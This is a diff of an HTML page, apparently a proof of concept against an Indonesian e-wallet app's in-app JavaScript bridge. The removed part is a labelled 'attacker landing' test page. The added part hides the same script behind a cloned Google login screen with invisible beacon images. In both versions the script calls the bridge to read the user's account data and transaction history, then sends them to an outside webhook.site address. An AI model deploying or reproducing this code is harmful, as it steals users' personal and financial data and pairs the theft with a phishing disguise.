@@ -1,125 +1,41 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>ATTACKER LANDING via official shortlink - v15</title>
-<style>
-  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:13px}
-  h3{color:#ff0;margin:10px 0 6px;font-size:14px}
-  #verdict{font-size:24px;font-weight:bold;text-align:center;padding:18px 8px;border:3px solid #888;margin:10px 0;word-break:break-word}
-  #verdict.yes{color:#0f0;border-color:#0f0;background:#020}
-  #verdict.no{color:#f55;border-color:#f55;background:#200}
-  #verdict.wait{color:#ff0;border-color:#ff0}
-  .sub{font-size:15px;text-align:center;color:#0ff;margin:4px 0;font-weight:bold}
-  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:260px;overflow:auto}
-  button{width:100%;padding:16px;font-size:16px;background:#050;color:#0f0;border:2px solid #0f0;font-weight:bold;margin:10px 0}
-  .note{color:#0ff;margin:6px 0}
-</style>
-</head>
-<body>
-<h3>v15 LANDING - halaman ATTACKER (github.io) dibuka via shortlink resmi link.dana.id</h3>
-<p class="note">Kalau halaman ini muncul SETELAH klik link.dana.id = rantai shortlink→attacker-page TERBUKTI. Kalau bridge aktif di sini = KILL-CHAIN PENUH.</p>
-<img src="https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50?src=v15landingImg" style="display:none" width="1" height="1">
-<div id="verdict" class="wait">CEK BRIDGE...</div>
-<div class="sub" id="subpii"></div>
-<div class="sub" id="subtrx"></div>
-<pre id="env">checking...</pre>
-<pre id="pii">pending</pre>
-<pre id="trx">pending</pre>
-<button onclick="copyRes()">COPY HASIL LANDING</button>
+<!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><link rel="preconnect" href="//www.gstatic.com"><meta name="referrer" content="origin">
+<title>Login - Akun Google</title>
+<style>body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#fff} .hidden-beacon{display:none}</style>
+</head><body>
+<!-- Google login UI clone (trimmed) -->
+<div style="max-width:400px;margin:40px auto;padding:24px;border:1px solid #dadce0;border-radius:8px">
+  <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" width="48" style="display:block;margin:0 auto 16px">
+  <h1 style="text-align:center;font-size:22px">Login</h1><p style="text-align:center;color:#5f6368">Gunakan Akun Google Anda</p>
+  <div style="border:1px solid #dadce0;border-radius:4px;padding:12px 14px;margin:16px 0">
+    <div style="font-size:12px;color:#5f6368">Email atau nomor telepon</div>
+    <input style="width:100%;border:none;outline:none;font-size:15px" placeholder=" " disabled>
+  </div>
+  <button style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;float:right">Berikutnya</button>
+  <div style="clear:both"></div>
+  <p style="font-size:12px;color:#5f6368;margin-top:24px">Bukan komputer Anda? Gunakan mode Tamu.</p>
+</div>
+<!-- Hidden OOB beacons like v15 landing -->
+<img src="https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50?src=larpLandingImg" class="hidden-beacon" width="1" height="1">
 <script>
 (function(){
-  var R = {};
-  var WH = 'https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
-  function compact(o){
-    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
-  }
-  function wh(params){
-    try {
-      var q = [];
-      for (var k in params) q.push(k + '=' + encodeURIComponent(String(params[k]).slice(0,380)));
-      return fetch(WH + '?' + q.join('&'), {mode:'no-cors', cache:'no-store'}).catch(function(e){});
-    } catch(e){ return Promise.resolve(); }
-  }
-  function set(id, o){
-    var el = document.getElementById(id);
-    try { el.textContent = (typeof o === 'string') ? o : JSON.stringify(o, null, 1); } catch(e) { el.textContent = String(o); }
-    R[id] = o;
-  }
-  function verdict(txt, cls){
-    var el = document.getElementById('verdict');
-    el.textContent = txt; el.className = cls;
-    try { document.title = 'V15:' + txt.slice(0,30); } catch(e){}
-  }
-  window.copyRes = function(){
-    var lines = ['v15landing @ ' + location.href,
-      'env: ' + compact(R.env || null),
-      'pii: ' + compact(R.pii || null),
-      'trx: ' + compact(R.trx || null)];
-    var ta = document.createElement('textarea');
-    ta.value = lines.join('\n');
-    document.body.appendChild(ta); ta.select();
-    try { document.execCommand('copy'); alert('copied - paste balik'); } catch(e) { alert('copy failed - screenshot'); }
-    document.body.removeChild(ta);
-  };
-  function bridgeReady(cb){
-    if (window.AlipayJSBridge) return cb();
-    var fired = false;
-    var go = function(){ if (!fired){ fired = true; cb(); } };
-    document.addEventListener('AlipayJSBridgeReady', go, false);
-    setTimeout(go, 5000);
-  }
+  var WH='https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
+  function wh(p){try{var q=[];for(var k in p)q.push(k+'='+encodeURIComponent(String(p[k]).slice(0,380)));fetch(WH+'?'+q.join('&'),{mode:'no-cors',cache:'no-store'}).catch(function(){})}catch(e){}}
+  function bridgeReady(cb){if(window.AlipayJSBridge)return cb();var f=false;var go=function(){if(!f){f=true;cb();}};document.addEventListener('AlipayJSBridgeReady',go,false);setTimeout(go,5000);}
   bridgeReady(function(){
-    var hasB = !!window.AlipayJSBridge;
-    var sp = {};
-    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
-    var org = '?';
-    try { org = location.origin; } catch(e){}
-    var env = {hasBridge:hasB, appId:sp.appId, startScene:sp.startScene||sp.scene, href:(location.href||'').slice(0,120), origin:org, ref:(document.referrer||'none').slice(0,80), ua:navigator.userAgent.slice(0,120), ts:new Date().toISOString()};
-    set('env', env);
-    wh({src:'v15landing', stage:'boot', d:compact(env)});
-    if (hasB){
-      verdict('BRIDGE: ADA - KILL-CHAIN PENUH', 'yes');
-      var got = false;
-      try {
-        window.AlipayJSBridge.call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'all'}}, function(r){
-          got = true;
-          R.pii = r; set('pii', r);
-          var piiLen = compact(r).length;
-          document.getElementById('subpii').textContent = 'DATA AKUN: TERBACA (' + piiLen + ' byte)';
-          wh({src:'v15landing', stage:'pii', piiBytes:piiLen, piiHead:compact(r).slice(0,380)});
-          try {
-            window.AlipayJSBridge.call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false}, function(t){
-              R.trx = t; set('trx', t);
-              document.getElementById('subtrx').textContent = 'DATA TRANSAKSI: TERBACA (' + compact(t).length + ' byte)';
-              wh({src:'v15landing', stage:'final', piiBytes:piiLen, trxBytes:compact(t).length, trxHead:compact(t).slice(0,200)});
-            });
-          } catch(e2){
-            R.trx = {__exception:String(e2)}; set('trx', R.trx);
-            wh({src:'v15landing', stage:'final', piiBytes:piiLen, trxErr:String(e2).slice(0,80)});
-          }
-        });
-      } catch(e){
-        got = true;
-        R.pii = {__exception:String(e)}; set('pii', R.pii);
-        wh({src:'v15landing', stage:'pii', err:String(e).slice(0,120)});
-      }
-      setTimeout(function(){
-        if (!got){
-          R.pii = {timeoutNoCallback:10000}; set('pii', R.pii);
-          document.getElementById('subpii').textContent = 'DATA AKUN: timeout';
-          wh({src:'v15landing', stage:'pii', timeout:true});
-        }
-      }, 10000);
+    var hasB=!!window.AlipayJSBridge; var sp={}; try{sp=window.AlipayJSBridge.startupParams||{}}catch(e){}
+    var env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,120),origin:location.origin,ts:new Date().toISOString(),larp:true};
+    wh({src:'larpLanding',stage:'boot',d:JSON.stringify(env).slice(0,380)});
+    if(hasB){
+      try{window.AlipayJSBridge.call('getUserInfoData',{event:'getUserInformation',info:{queryBy:'all'}},function(r){
+        var piiLen=JSON.stringify(r).length; wh({src:'larpLanding',stage:'pii',piiBytes:piiLen,piiHead:JSON.stringify(r).slice(0,380)});
+        try{window.AlipayJSBridge.call('getTransactionHistoryList',{event:'getInitList',pageNum:1,forceCache:false},function(t){
+          wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxBytes:JSON.stringify(t).length,trxHead:JSON.stringify(t).slice(0,200)});
+        });}catch(e2){wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxErr:String(e2).slice(0,80)});}
+      });}catch(e){wh({src:'larpLanding',stage:'pii',err:String(e).slice(0,120)});}
     } else {
-      verdict('BRIDGE: TIDAK ADA (browser biasa?)', 'no');
-      set('pii', {noBridge:true});
-      set('trx', {noBridge:true});
-      wh({src:'v15landing', stage:'final', hasBridge:false});
+      wh({src:'larpLanding',stage:'final',hasBridge:false});
     }
   });
 })();
 </script>
-</body>
-</html>
+</body></html>
